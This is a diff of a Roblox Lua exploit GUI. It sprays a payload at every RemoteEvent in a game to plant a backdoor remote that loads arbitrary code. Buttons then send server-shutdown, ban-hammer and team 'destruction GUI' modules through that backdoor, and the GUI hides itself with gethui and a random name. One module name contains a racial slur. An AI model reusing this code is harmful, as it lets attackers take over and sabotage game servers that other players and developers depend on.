@@ -1,821 +1,689 @@
-local Players=game:GetService("Players")
-local player=Players.LocalPlayer
-local gui=Instance.new("ScreenGui",game:GetService("CoreGui"))
+local plr=game:GetService("Players")
+local Lp=plr.LocalPlayer
+local gui=Instance.new("ScreenGui",getfenv().gethui and getfenv().gethui() or game:GetService("CoreGui") or Lp:WaitForChild("PlayerGui"))
 gui.Name="UI_"..tostring(math.random(1,100))..tostring(math.random(1,50))..tostring(math.random(1,100))..tostring(math.random(1,50))..tostring(math.random(1,100))..tostring(math.random(1,50))..tostring(math.random(1,100))
-gui.DisplayOrder=999
+gui.DisplayOrder=9999
 gui.ResetOnSpawn=false
-local frame = Instance.new("Frame", gui)
-frame.Position = UDim2.new(0, 270, 0, 50)
-frame.Size = UDim2.new(0, 250, 0, 190)
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-frame.Active = true
-frame.Draggable = true
-Instance.new("UICorner",frame).CornerRadius=UDim.new(0,3)
-Instance.new("UIStroke",frame).Color=Color3.new(1,1,1)
-local line = Instance.new("Frame", frame)
-line.Position = UDim2.new(0, 0, 0, 39)
-line.Size = UDim2.new(0, 250, 0, 1)
-line.BackgroundColor3 = Color3.new(1, 1, 1)
-line.BorderSizePixel = 0
-local KP = Instance.new("Frame", frame)
-KP.Position = UDim2.new(0, 0, 0, 40)
-KP.Size = UDim2.new(0, 250, 0, 150)
-KP.BackgroundTransparency = 1
-local KP2 = Instance.new("Frame", KP)
-KP2.Position = UDim2.new(0, 0, 0, 0)
-KP2.Size = UDim2.new(0, 250, 0, 150)
-KP2.BackgroundTransparency = 1
-local KP3 = Instance.new("Frame", KP)
-KP3.Position = UDim2.new(0, 0, 0, 0)
-KP3.Size = UDim2.new(0, 250, 0, 150)
-KP3.Visible = false
-KP3.BackgroundTransparency = 1
-local scroll = Instance.new("ScrollingFrame", KP)
-scroll.Position = UDim2.new(0, 0, 0, 0)
-scroll.Size = UDim2.new(0, 250, 0, 150)
-scroll.BackgroundColor3 = Color3.new(1, 1, 1)
-scroll.ScrollBarThickness = 0
-scroll.CanvasSize = UDim2.new(0, 0, 2, 0)
-scroll.Visible = false
-scroll.BackgroundTransparency = 1
-local scroll2 = Instance.new("ScrollingFrame", KP)
-scroll2.Position = UDim2.new(0, 0, 0, 0)
-scroll2.Size = UDim2.new(0, 250, 0, 150)
-scroll2.BackgroundColor3 = Color3.new(1, 1, 1)
-scroll2.ScrollBarThickness = 0
-scroll2.CanvasSize = UDim2.new(0, 0, 3, 0)
-scroll2.Visible = false
-scroll2.BackgroundTransparency = 1
-local scroll3 = Instance.new("ScrollingFrame", KP)
-scroll3.Position = UDim2.new(0, 0, 0, 0)
-scroll3.Size = UDim2.new(0, 250, 0, 150)
-scroll3.BackgroundColor3 = Color3.new(1, 1, 1)
-scroll3.ScrollBarThickness = 0
-scroll3.CanvasSize = UDim2.new(0, 0, 2, 0)
-scroll3.Visible = false
-scroll3.BackgroundTransparency = 1
-local scroll4 = Instance.new("ScrollingFrame", KP)
-scroll4.Position = UDim2.new(0, 0, 0,  155)
-scroll4.Size = UDim2.new(0, 250, 0, 45)
-scroll4.BackgroundColor3 = Color3.new(0, 0, 0)
-scroll4.ScrollBarThickness = 0
-scroll4.CanvasSize = UDim2.new(4, 80, 0, 0)
-scroll4.Visible = false
-Instance.new("UICorner", scroll4).CornerRadius=UDim.new(0,3)
-Instance.new("UIStroke",scroll4).Color=Color3.new(1,1,1)
 
-local box = Instance.new("TextBox", KP2)
-box.Position = UDim2.new(0, 10, 0, 10)
-box.Size = UDim2.new(0, 230, 0, 80)
-box.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-box.Font = Enum.Font.Gotham
-box.Text = 'require(12012115295).load("'..player.Name..'")'
-box.PlaceholderText = "-- Cookies SS"
-box.TextSize = 14
-box.TextColor3 = Color3.new(1, 1, 1)
-box.TextTransparency = 0
-box.TextXAlignment = Enum.TextXAlignment.Left
-box.TextYAlignment = Enum.TextYAlignment.Top
-box.ClearTextOnFocus = false
-box.TextWrapped = true
-local Uis = Instance.new("UIStroke", box)
-Uis.Color = Color3.new(1,1,1)
-Uis.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-Instance.new("UICorner",box).CornerRadius=UDim.new(0,3)
-
-local function createTextButton(position, size, name, textSize, text, parent)
-    local btn = Instance.new("TextButton")
-    btn.Position = position
-    btn.Size = size
-    btn.BackgroundColor3 = Color3.new(0,0,0)
-    btn.Name = name
-    btn.TextSize = textSize
-    btn.Text = text
-    btn.TextColor3 = Color3.new(1,1,1)
-    btn.Font = Enum.Font.SourceSans
-    btn.Parent = parent
-    Instance.new("UICorner",btn).CornerRadius=UDim.new(0,3)
-    local Uis = Instance.new("UIStroke", btn)
-    Uis.Color = Color3.new(1,1,1)
-    Uis.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    return btn
+local function uis(parent)
+ local Uis=Instance.new("UIStroke",parent)
+ Uis.Color=Color3.new(1,1,1)
+ Uis.ApplyStrokeMode="Border"
 end
 
-local x = createTextButton(UDim2.new(0, 220, 0, 10), UDim2.new(0, 20, 0, 20), "x", 16, "X", frame)
+local function create(new,pos,size,parent)
+ local kp=Instance.new(new,parent)
+ kp.Position=pos
+ kp.Size=size
+ kp.BackgroundColor3=Color3.new(0,0,0)
+ kp.Active=true
+ return kp
+end
+
+local frame=create("Frame",UDim2.new(0,270,0,50),UDim2.new(0,250,0,190),gui)
+frame.Draggable=true
+Instance.new("UICorner",frame).CornerRadius=UDim.new(0,3)
+Instance.new("UIStroke",frame).Color=Color3.new(1,1,1)
+local line=create("Frame",UDim2.new(0,0,0,39),UDim2.new(0,250,0,1),frame)
+line.BackgroundColor3=Color3.new(1,1,1)
+line.BorderSizePixel=0
+local KP=create("Frame",UDim2.new(0,0,0,40),UDim2.new(0,250,0,150),frame)
+KP.BackgroundTransparency=1
+local KP2=create("Frame",UDim2.new(0,0,0,0),UDim2.new(0,250,0,150),KP)
+KP2.BackgroundTransparency=1
+local KP3=create("Frame",UDim2.new(0,0,0,0),UDim2.new(0,250,0,150),KP)
+KP3.Visible=false
+KP3.BackgroundTransparency=1
+local scroll=create("ScrollingFrame",UDim2.new(0,0,0,0),UDim2.new(0,250,0,150),KP)
+scroll.BackgroundColor3=Color3.new(1,1,1)
+scroll.ScrollBarThickness=0
+scroll.CanvasSize=UDim2.new(0,0,2,40)
+scroll.Visible=false
+scroll.BackgroundTransparency=1
+local scroll2=create("ScrollingFrame",UDim2.new(0,0,0,0),UDim2.new(0,250,0,150),KP)
+scroll2.BackgroundColor3=Color3.new(1,1,1)
+scroll2.ScrollBarThickness=0
+scroll2.CanvasSize=UDim2.new(0,0,3,0)
+scroll2.Visible=false
+scroll2.BackgroundTransparency=1
+local scroll3=create("ScrollingFrame",UDim2.new(0,0,0,0),UDim2.new(0,250,0,150),KP)
+scroll3.BackgroundColor3=Color3.new(1,1,1)
+scroll3.ScrollBarThickness=0
+scroll3.CanvasSize=UDim2.new(0,0,2,0)
+scroll3.Visible=false
+scroll3.BackgroundTransparency=1
+local scroll4=create("ScrollingFrame",UDim2.new(0,0,0,155),UDim2.new(0,250,0,45),KP)
+scroll4.ScrollBarThickness=0
+scroll4.CanvasSize=UDim2.new(4,80,0,0)
+scroll4.Visible=false
+uis(scroll4)
+Instance.new("UICorner",scroll4).CornerRadius=UDim.new(0,3)
+
+local box=Instance.new("TextBox",KP2)
+box.Position=UDim2.new(0,10,0,10)
+box.Size=UDim2.new(0,230,0,80)
+box.BackgroundColor3=Color3.new(0,0,0)
+box.Font="Gotham"
+box.Text='require(12012115295).load("'..Lp.Name..'")'
+box.PlaceholderText="-- Cookies SS"
+box.TextSize=14
+box.TextColor3=Color3.new(1,1,1)
+box.TextXAlignment="Left"
+box.TextYAlignment="Top"
+box.ClearTextOnFocus=false
+box.TextWrapped=true
+uis(box)
+
+local function create2(pos,size,textSize,text,parent)
+ local btn=Instance.new("TextButton",parent)
+ btn.Position=pos
+ btn.Size=size
+ btn.BackgroundColor3=Color3.new(0,0,0)
+ btn.TextSize=textSize
+ btn.Text=text
+ btn.TextColor3=Color3.new(1,1,1)
+ btn.Font="SourceSans"
+ Instance.new("UICorner",btn).CornerRadius=UDim.new(0,3)
+ uis(btn)
+ return btn
+end
+
+local x=create2(UDim2.new(0,220,0,10),UDim2.new(0,20,0,20),16,"X",frame)
 x.MouseButton1Click:Connect(function()
 gui:Destroy()
 end)
 
-local mini = createTextButton(UDim2.new(0, 190, 0, 10), UDim2.new(0, 20, 0, 20), "mini", 16, "-", frame)
+local mini=create2(UDim2.new(0,190,0,10),UDim2.new(0,20,0,20),16,"-",frame)
 mini.MouseButton1Click:Connect(function()
 if KP.Visible then
-   frame.Size = UDim2.new(0, 250, 0, 40)
-   KP.Visible = false
-   mini = false
-   line.Visible = false
-   mini = true
+ frame.Size=UDim2.new(0,250,0,40)
+ KP.Visible=false
+ line.Visible=false
 else
-   frame.Size = UDim2.new(0, 250, 0, 190)
-   KP.Visible = true
-   line.Visible = true
-   end
+ frame.Size=UDim2.new(0,250,0,190)
+ KP.Visible=true
+ line.Visible=true
+end
 end)
 
-local file = createTextButton(UDim2.new(0, 160, 0, 10), UDim2.new(0, 20, 0, 20), "file", 12, "File", frame)
+local file=create2(UDim2.new(0,160,0,10),UDim2.new(0,20,0,20),12,"File",frame)
 file.MouseButton1Click:Connect(function()
 if KP2.Visible then
-   KP2.Visible = false
-   KP3.Visible = true
-   scroll.Visible = false
-   scroll2.Visible = false
-   scroll3.Visible = false
+ KP2.Visible=false
+ KP3.Visible=true
+ scroll.Visible=false
+ scroll2.Visible=false
+ scroll3.Visible=false
 else
-   KP2.Visible = true
-   KP3.Visible = false
-   scroll.Visible = false
-   scroll2.Visible = false
-   scroll3.Visible = false
-   end
+ KP2.Visible=true
+ KP3.Visible=false
+ scroll.Visible=false
+ scroll2.Visible=false
+ scroll3.Visible=false
+end
 end)
 
-local open = createTextButton(UDim2.new(0, 130, 0, 10), UDim2.new(0, 20, 0, 20), "open", 10, "Open", frame)
+local open=create2(UDim2.new(0,130,0,10),UDim2.new(0,20,0,20),10,"Open",frame)
 open.MouseButton1Click:Connect(function()
 if scroll4.Visible then
-   scroll4.Visible = false
+ scroll4.Visible=false
 else
-   scroll4.Visible = true
-   end
+ scroll4.Visible=true
+end
 end)
 
-function notify(title, text)
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title=title,
-    Text=text,
-    Duration=5,
-})
+local function notify(title,text)
+game:GetService("StarterGui"):SetCore("SendNotification",{Title=title,Text=text,Duration=5})
 end
 
-local exe = createTextButton(UDim2.new(0, 10, 0, 103), UDim2.new(0, 60, 0, 35), "exe", 16, "Execute", KP2)
-exe.MouseButton1Click:Connect(function()
+local execute=create2(UDim2.new(0,10,0,103),UDim2.new(0,60,0,35),16,"Inject",KP2)
+execute.MouseButton1Click:Connect(function()
 if game:GetService("JointsService"):FindFirstChild("CC") then
-local Execute=game:GetService("JointsService"):FindFirstChild("CC"):FireServer(box.Text)
-	else
-		notify("Something Was Wrong", "Failed to loadstring: Error 404")
-   end
-end)
-
-local btn2 = Instance.new("TextButton", KP2)
-btn2.Position = UDim2.new(0, 10, 0, 103)
-btn2.Size = UDim2.new(0, 60, 0, 35)
-btn2.BackgroundColor3 = Color3.new(0,0,0)
-btn2.TextSize = 16
-btn2.Text = "Inject"
-btn2.TextColor3 = Color3.new(1,1,1)
-btn2.Font = Enum.Font.SourceSans
-Instance.new("UICorner",btn2).CornerRadius=UDim.new(0,3)
-btn2.MouseButton1Click:Connect(function()
-if game:WaitForChild("JointsService"):FindFirstChild("CC") then
-    notify("Already Injected!", "Seem like the code already run!")
-    btn2:Destroy()
+ local Execute=game:GetService("JointsService"):FindFirstChild("CC"):FireServer(box.Text)
+ execute.Text="Execute"
 else
-	local function b_G_V12(see)
-		local a = function(ree)
-			ree:FireServer([[
-                    local folder = Instance.new('RemoteEvent')
-                    folder.Name = "CC"
-                    folder.Parent = game:GetService("JointsService")
-                    local loadstring = require(13684410229)
-                    folder.OnServerEvent:Connect(function(_1,_2)
-                       loadstring(_2)()
-                    end)
-                    ]])
-		end
-		for i, v in pairs(see:GetChildren()) do
-			if v:IsA("RemoteEvent") then
-				if not string.match(string.lower(v.Name), "ban") then
-					if not string.match(string.lower(v.Name), "kick") then
-						a(v)
-					end
-				end
-			end
-			b_G_V12(v)
-		end
-	end
-	local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
-	local timetoken = 0
-	local maxtime = 5
-	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("CC") or timetoken >= maxtime
-    btn2:Destroy()
+ local function b_G_V12(see)
+  local a=function(ree)
+  ree:FireServer([[
+   local folder=Instance.new('RemoteEvent')
+   folder.Name="CC"
+   folder.Parent=game:GetService("JointsService")
+   local loadstring=require(13684410229)
+   folder.OnServerEvent:Connect(function(_1,_2)loadstring(_2)()end)]])
+ end
+ for i,v in pairs(see:GetChildren()) do
+  if v:IsA("RemoteEvent") then
+   if not string.match(string.lower(v.Name),"ban") then
+    if not string.match(string.lower(v.Name),"kick") then
+     a(v)
+     end
+    end
    end
+   b_G_V12(v)
+  end
+ end
+ local Inject=b_G_V12(game:GetService("ReplicatedStorage"))
+ local timetoken=0
+ local maxtime=5
+ repeat wait(0.1) timetoken+=0.1 until game:GetService("JointsService"):FindFirstChild("CC") or timetoken>=maxtime
+ execute.Text="Execute"
+end
 end)
 
-function execute(s)
-	if game:GetService("JointsService"):FindFirstChild("CC") then
-		local Execute=game:GetService("JointsService"):FindFirstChild("CC"):FireServer(tostring(s))
-	else
-		notify("Something Was Wrong", "Failed to loadstring: Error 404")
-	end
-end
-
-local clear = createTextButton(UDim2.new(0, 83, 0, 103), UDim2.new(0, 60, 0, 35), "clear", 16, "Clear", KP2)
+local clear=create2(UDim2.new(0,83,0,103),UDim2.new(0,60,0,35),16,"Clear",KP2)
 clear.MouseButton1Click:Connect(function()
 box.Text=""
 end)
 
-local r6 = createTextButton(UDim2.new(0, 156, 0, 103), UDim2.new(0, 35, 0, 35), "r6", 16, "R6", KP2)
+local function exe(s)
+ if game:GetService("JointsService"):FindFirstChild("CC") then
+  local Execute=game:GetService("JointsService"):FindFirstChild("CC"):FireServer(tostring(s))
+else
+  notify("Something Is Wrong","Failed to loadstring: Error 404")
+end
+end
+
+local r6=create2(UDim2.new(0,156,0,103),UDim2.new(0,35,0,35),16,"R6",KP2)
 r6.MouseButton1Click:Connect(function()
-execute('require(3436957371):r6("'..player.Name..'")')
+exe('require(3436957371):r6("'..Lp.Name..'")')
 end)
 
-local re = createTextButton(UDim2.new(0, 204, 0, 103), UDim2.new(0, 35, 0, 35), "re", 16, "RE", KP2)
+local re=create2(UDim2.new(0,204,0,103),UDim2.new(0,35,0,35),16,"RE",KP2)
 re.MouseButton1Click:Connect(function()
-
+exe('')
 end)
 
-local page = createTextButton(UDim2.new(0, 10, 0, 10), UDim2.new(0, 70, 0, 130), "page", 10, "Destruction GUI", KP3)
+local page=create2(UDim2.new(0,10,0,10),UDim2.new(0,70,0,130),10,"Destruction GUI",KP3)
 page.MouseButton1Click:Connect(function()
 if KP3.Visible then
-   KP3.Visible = false
-   scroll.Visible = true
+ KP3.Visible=false
+ scroll.Visible=true
 else
-   KP3.Visible = true
-   scroll.Visible = false
-   end
+ KP3.Visible=true
+ scroll.Visible=false
+end
 end)
 
-local page2 = createTextButton(UDim2.new(0, 90, 0, 10), UDim2.new(0, 70, 0, 130), "page2", 14, "GUI & Script", KP3)
+local page2=create2(UDim2.new(0,90,0,10),UDim2.new(0,70,0,130),14,"GUI & Script",KP3)
 page2.MouseButton1Click:Connect(function()
 if KP3.Visible then
-   KP3.Visible = false
-   scroll2.Visible = true
+ KP3.Visible=false
+ scroll2.Visible=true
 else
-   KP3.Visible = true
-   scroll2.Visible = false
-   end
+ KP3.Visible=true
+ scroll2.Visible=false
+end
 end)
 
-local page3 = createTextButton(UDim2.new(0, 170, 0, 10), UDim2.new(0, 70, 0, 130), "page3", 16, "Map", KP3)
+local page3=create2(UDim2.new(0,170,0,10),UDim2.new(0,70,0,130),16,"Map",KP3)
 page3.MouseButton1Click:Connect(function()
 if KP3.Visible then
-   KP3.Visible = false
-   scroll3.Visible = true
+ KP3.Visible=false
+ scroll3.Visible=true
 else
-   KP3.Visible = true
-   scroll3.Visible = false
-   end
+ KP3.Visible=true
+ scroll3.Visible=false
+end
 end)
 
-local os=createTextButton(UDim2.new(0,5,0,5),UDim2.new(0,70,0,35),"os",12,"Shutdown",scroll4)
+local os=create2(UDim2.new(0,5,0,5),UDim2.new(0,70,0,35),12,"Shutdown",scroll4)
 os.MouseButton1Click:Connect(function()
-box.Text='require(90189679709013).shutdown("'..player.Name..'","Server Is Shutdown")'
+box.Text='require(90189679709013).shutdown("'..Lp.Name..'","Server Is Shutdown")'
 end)
 
-local os=createTextButton(UDim2.new(0,81,0,5),UDim2.new(0,70,0,35),"os",10,"Gravity Hammer",scroll4)
+local os=create2(UDim2.new(0,81,0,5),UDim2.new(0,70,0,35),10,"Gravity Hammer",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(12012115295).load("'..player.Name..'")')
+exe('require(12012115295).load("'..Lp.Name..'")')
 end)
 
-local os=createTextButton(UDim2.new(0,157,0,5),UDim2.new(0,70,0,35),"os",10,"Kick Hammer Gun",scroll4)
+local os=create2(UDim2.new(0,157,0,5),UDim2.new(0,70,0,35),10,"Kick Hammer Gun",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(2555964157).doom("'..player.Name..'")')
+exe('require(2555964157).doom("'..Lp.Name..'")')
 end)
 
-local os=createTextButton(UDim2.new(0,233,0,5),UDim2.new(0,70,0,35),"os",12,"Ban Hammer",scroll4)
+local os=create2(UDim2.new(0,233,0,5),UDim2.new(0,70,0,35),12,"Ban Hammer",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(5448035802).Hammer("'..player.Name..'","BanHammer")')
+exe('require(5448035802).Hammer("'..Lp.Name..'","BanHammer")')
 end)
 
-local os=createTextButton(UDim2.new(0,309,0,5),UDim2.new(0,70,0,35),"os",16,"F3X",scroll4)
+local os=create2(UDim2.new(0,309,0,5),UDim2.new(0,70,0,35),16,"F3X",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(4869378421).F3X("'..player.Name..'")')
+exe('require(4869378421).F3X("'..Lp.Name..'")')
 end)
 
-local os=createTextButton(UDim2.new(0,385,0,5),UDim2.new(0,70,0,35),"os",12,"furry converter",scroll4)
+local os=create2(UDim2.new(0,385,0,5),UDim2.new(0,70,0,35),12,"furry converter",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(91076156758428)("'..player.Name..'")')
+exe('require(91076156758428)("'..Lp.Name..'")')
 end)
 
-local os=createTextButton(UDim2.new(0,461,0,5),UDim2.new(0,70,0,35),"os",14,"volt bike",scroll4)
+local os=create2(UDim2.new(0,461,0,5),UDim2.new(0,70,0,35),14,"volt bike",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(4021975182).load("'..player.Name..'")')
+exe('require(4021975182).load("'..Lp.Name..'")')
 end)
 
-local os=createTextButton(UDim2.new(0,537,0,5),UDim2.new(0,70,0,35),"os",14,"Hyper Car",scroll4)
+local os=create2(UDim2.new(0,537,0,5),UDim2.new(0,70,0,35),14,"Hyper Car",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(5874393699).load("'..player.Name..'")')
+exe('require(5874393699).load("'..Lp.Name..'")')
 end)
 
-local os=createTextButton(UDim2.new(0,613,0,5),UDim2.new(0,70,0,35),"os",12,"Neko",scroll4)
+local os=create2(UDim2.new(0,613,0,5),UDim2.new(0,70,0,35),14,"Neko",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(128475652583968)(player.Name,"script()"')
+exe('require(128475652583968)("'..Lp.Name..'","script()")')
 end)
 
-local os=createTextButton(UDim2.new(0,689,0,5),UDim2.new(0,70,0,35),"os",10,"Ichigo Movement",scroll4)
+local os=create2(UDim2.new(0,689,0,5),UDim2.new(0,70,0,35),10,"Ichigo Movement",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(89529616632600)("'..player.Name..'","Ichigo")')
+exe('require(89529616632600)("'..Lp.Name..'","Ichigo")')
 end)
 
-local os=createTextButton(UDim2.new(0,765,0,5),UDim2.new(0,70,0,35),"os",10,"Aizen Movement",scroll4)
+local os=create2(UDim2.new(0,765,0,5),UDim2.new(0,70,0,35),10,"Aizen Movement",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(89529616632600)("'..player.Name..'","Aizen")')
+exe('require(89529616632600)("'..Lp.Name..'","Aizen")')
 end)
 
-local os=createTextButton(UDim2.new(0,841,0,5),UDim2.new(0,70,0,35),"os",12,"Baby Trower",scroll4)
+local os=create2(UDim2.new(0,841,0,5),UDim2.new(0,70,0,35),12,"Baby Trower",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(16991251417)("'..player.Name..'")')
+exe('require(16991251417)("'..Lp.Name..'")')
 end)
 
-local os=createTextButton(UDim2.new(0,841,0,5),UDim2.new(0, 70, 0, 35),"os",14,"Inc Gun",scroll4)
+local os=create2(UDim2.new(0,841,0,5),UDim2.new(0, 70, 0, 35),14,"Inc Gun",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(16668929184).load("'..player.Name..'","asd")')
+exe('require(16668929184).load("'..Lp.Name..'","asd")')
 end)
 
-local os=createTextButton(UDim2.new(0,917,0,5),UDim2.new(0,70,0,35),"os",12,"Combat Weapon",scroll4)
+local os=create2(UDim2.new(0,917,0,5),UDim2.new(0,70,0,35),12,"Combat Weapon",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(10051684510).tool("'..player.Name..'","M")')
+exe('require(10051684510).tool("'..Lp.Name..'","M")')
 end)
 
-local os=createTextButton(UDim2.new(0,993,0,5),UDim2.new(0, 70, 0, 35),"os",12,"SubStrike",scroll4)
+local os=create2(UDim2.new(0,993,0,5),UDim2.new(0, 70, 0, 35),12,"SubStrike",scroll4)
 os.MouseButton1Click:Connect(function()
-execute('require(14775634069)("'..player.Name..'")')
+exe('require(14775634069)("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 5, 0, 5), UDim2.new(0, 56, 0, 35),"guis",8, "Team fat Gui v21", scroll)
+local guis=create2(UDim2.new(0,5,0,5),UDim2.new(0,56,0,35),8,"Team fat Gui v21",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(14940596979).fat("'..player.Name..'")')
+exe('require(14940596979).fat("'..Lp.Name..'")')
 setclipboard("teamfatguiv19easter")
 end)
 
-local guis = createTextButton(UDim2.new(0, 66, 0, 5), UDim2.new(0, 56, 0, 35), "guis",8, "Secret K00pgui v4", scroll)
+local guis=create2(UDim2.new(0,66,0,5),UDim2.new(0,56,0,35),8,"Secret K00pgui v4",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(16965754044):load("'..player.Name..'")')
+exe('require(16965754044):load("'..Lp.Name..'")')
 setclipboard("Zelow")
 end)
 
-local guis = createTextButton(UDim2.new(0, 128, 0, 5), UDim2.new(0, 56, 0, 35), "guis",10, "H01PK Gui V21", scroll)
+local guis=create2(UDim2.new(0,128,0,5),UDim2.new(0,56,0,35),10,"H01PK Gui V21",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(0x4af2144545ce).ALLNIGGAITISKINGV44LEAKKKkh01pkOnTOP("'..player.Name..'")')
+exe('require(0x4af2144545ce).ALLNIGGAITISKINGV44LEAKKKkh01pkOnTOP("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 189, 0, 5), UDim2.new(0, 56, 0, 35), "guis",10, "xpl0id v5 Gui", scroll)
+local guis=create2(UDim2.new(0,189,0,5),UDim2.new(0,56,0,35),10,"xpl0id v5 Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(77025880046082).v5("'..player.Name..'")')
+exe('require(77025880046082).v5("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 5, 0, 46), UDim2.new(0, 56, 0, 35), "guis",10, "Dr4g Gui v5", scroll)
+local guis=create2(UDim2.new(0,5,0,46),UDim2.new(0,56,0,35),10,"Dr4g Gui v5",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(0x391c103dd).load("'..player.Name..'")')
+exe('require(0x391c103dd).load("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 66, 0, 46), UDim2.new(0, 56, 0, 35), "guis",10, "Darius Gui v13", scroll)
+local guis=create2(UDim2.new(0,66,0,46),UDim2.new(0,56,0,35),10,"Darius Gui v13",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(127445614272366).op("'..player.Name..'")')
+exe('require(127445614272366).op("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 128, 0, 46), UDim2.new(0, 56, 0, 35), "guis",10, "K00pgui v11", scroll)
+local guis=create2(UDim2.new(0,128,0,46),UDim2.new(0,56,0,35),10,"K00pgui v11",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(15267263357).V11("'..player.Name..'")')
+exe('require(15267263357).V11("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 189, 0, 46), UDim2.new(0, 56, 0, 35), "guis",10, "Tubers93 Gui v4", scroll)
+local guis=create2(UDim2.new(0,189,0,46),UDim2.new(0,56,0,35),10,"Tubers93 Gui v4",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(0x78091b7cd92c)("'..player.Name..'")')
+exe('require(0x78091b7cd92c)("'..Lp.Name..'")')
 setclipboard("or2z9FzpLDdAVX+RaKu22Q==")
 end)
 
-local guis = createTextButton(UDim2.new(0, 5, 0, 87), UDim2.new(0, 56, 0, 35), "guis",10, "R7J Gui v4", scroll)
+local guis=create2(UDim2.new(0,5,0,87),UDim2.new(0,56,0,35),10,"R7J Gui v4",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(0x488847B83D83).TeamR7J("'..player.Name..'")')
+exe('require(0x488847B83D83).TeamR7J("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 66, 0, 87), UDim2.new(0, 56, 0, 35), "guis",10, "p00ngkidd Gui", scroll)
+local guis=create2(UDim2.new(0,66,0,87),UDim2.new(0,56,0,35),10,"p00ngkidd Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(15204636597).undetectb("'..player.Name..'")')
+execute('require(15204636597).undetectb("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 128, 0, 87), UDim2.new(0, 56, 0, 35), "guis",10, "C4N0F Gui v15.5", scroll)
+local guis=create2(UDim2.new(0,128,0,87),UDim2.new(0,56,0,35),10,"C4N0F Gui v15.5",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(86767995498200):C4N0FV17("'..player.Name..'")')
+exe('require(86767995498200):C4N0FV17("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 189, 0, 87), UDim2.new(0, 56, 0, 35), "guis",8, "Team BadsStuff Gui", scroll)
+local guis=create2(UDim2.new(0,189,0,87),UDim2.new(0,56,0,35),8,"Team BadsStuff Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(15680206962).rust("'..player.Name..'")')
+exe('require(15680206962).rust("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 5, 0, 128), UDim2.new(0, 56, 0, 35), "guis",8, "Sheldon.exe Gui", scroll)
+local guis=create2(UDim2.new(0,5,0,128),UDim2.new(0,56,0,35),8,"Sheldon.exe Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(96855101727017):Load("'..player.Name..'")')
+exe('require(96855101727017):Load("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 66, 0, 128), UDim2.new(0, 56, 0, 35), "guis",8, "Dryq74 Gui", scroll)
+local guis=create2(UDim2.new(0,66,0,128),UDim2.new(0,56,0,35),8,"Dryq74 Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(134839673375508).Dryq74gui("'..player.Name..'")')
+exe('require(134839673375508).Dryq74gui("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 128, 0, 128), UDim2.new(0, 56, 0, 35), "guis",10, "1x1x1x1 Gui", scroll)
+local guis=create2(UDim2.new(0,128,0,128),UDim2.new(0,56,0,35),10,"1x1x1x1 Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(6858594080).KrnKidsSus("'..player.Name..'")')
+exe('require(6858594080).KrnKidsSus("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 189, 0, 128), UDim2.new(0, 56, 0, 35), "guis",8, "Dream-Bull Gui v18", scroll)
+local guis=create2(UDim2.new(0,189,0,128),UDim2.new(0,56,0,35),8,"Dream-Bull Gui v18",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(15232587754).DreamGUI("'..player.Name..'")')
+exe('require(15232587754).DreamGUI("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 5, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 8, "Blue2Spooky Gui", scroll)
+local guis=create2(UDim2.new(0,5,0,169),UDim2.new(0,56,0,35),8,"Blue2Spooky Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(132099457182422):blue2spooky("'..player.Name..'")')
+exe('require(132099457182422):blue2spooky("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 66, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 12, "ByteGui v5", scroll)
